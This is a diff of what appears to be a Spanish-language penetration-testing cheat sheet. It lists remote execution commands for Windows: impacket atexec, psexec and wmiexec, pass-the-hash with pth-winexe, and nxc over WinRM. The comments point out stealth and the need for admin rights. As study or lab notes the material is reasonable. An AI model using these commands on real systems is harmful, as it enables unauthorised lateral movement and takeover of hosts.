@@ -534,14 +534,6 @@ NOTA:
 ❯ impacket-atexec domain/user:'pass'@<IP> "whoami"
 # Ejecución vía Task Scheduler — más sigiloso que psexec
 
-❯ impacket-wmiexec 'Administrator'@<IP> -hashes LM:NT
-# Más sigiloso (no crea servicio)
-# Requiere admin local
-
-❯ impacket-wmiexec domain.corp/Administrator@<IP> -no-pass -hashes LM:NT
-# Variante con dominio
-# -no-pass → indica que usas hash, no password
-
 ❯ impacket-psexec user:pass@<IP>
 # Shell SYSTEM
 # Requiere admin local
@@ -550,24 +542,12 @@ NOTA:
 	❯ dir C:\Users     # No te deja usar el comando 'cd'
 # Alternativa cuando psexec falla
 
-❯ impacket-wmiexec user:pass@<IP>
-# Más sigiloso (no crea servicio)
-
 ❯ pth-winexe -U 'domain/user%LM:NT' //<IP> cmd.exe
 # El hash debe ir como 'LM:NT'
 # Pass-the-Hash remoto
 # Requiere:
 # - credenciales admin
 # - SMB accesible
-```
-
-```bash
-❯ nxc winrm <IP> -u 'user' -p 'pass'
-# Requiere grupo "Remote Management Users" → acceso remoto
-# Muestra [Pwn3d!]
-
-❯ nxc winrm <IP> -u 'user' -p 'pass' -d domain -x 'whoami'
-# Ejecución remota vía WinRM
 ```
 
 ## 8. Dump de credenciales
